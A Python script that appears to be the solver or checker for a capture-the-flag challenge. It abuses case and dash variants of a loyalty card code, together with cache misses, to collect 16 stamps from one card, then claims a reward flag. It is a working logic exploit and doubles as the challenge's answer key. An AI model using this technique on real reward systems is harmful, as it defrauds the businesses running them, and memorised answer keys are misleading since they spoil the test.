#!/usr/bin/env python3
import re
import sys
from itertools import product

import requests


def representations(code: str):
    letters = [i for i, char in enumerate(code) if char.isalpha()]
    for bits in product((False, True), repeat=len(letters)):
        chars = list(code)
        for index, lower in zip(letters, bits):
            chars[index] = chars[index].lower() if lower else chars[index].upper()
        value = ''.join(chars)
        yield value
        yield '-'.join((value[:4], value[4:8], value[8:12], value[12:]))


def main() -> int:
    if len(sys.argv) != 2:
        return 2
    base = sys.argv[1].rstrip('/')
    session = requests.Session()
    response = session.get(base + '/', timeout=5)
    response.raise_for_status()
    card = session.get(base + '/api/card', timeout=5)
    card.raise_for_status()
    canonical = card.json()['displayCode'].replace('-', '')

    seen = set()
    stamps = 0
    for value in representations(canonical):
        if value in seen:
            continue
        seen.add(value)
        response = session.get(base + '/api/visit?card=' + value, timeout=5)
        if response.status_code != 200 or response.headers.get('X-Cache') != 'MISS':
            return 1
        stamps = response.json().get('stamps', -1)
        if stamps != len(seen):
            return 1
        if stamps == 16:
            break
    if stamps != 16:
        return 1
    reward = session.post(base + '/api/reward/claim', timeout=5)
    reward.raise_for_status()
    code = reward.json().get('code', '')
    if not re.fullmatch(r'stctf\{[^{}\s]+\}', code):
        return 1
    print(code)
    return 0


if __name__ == '__main__':
    raise SystemExit(main())
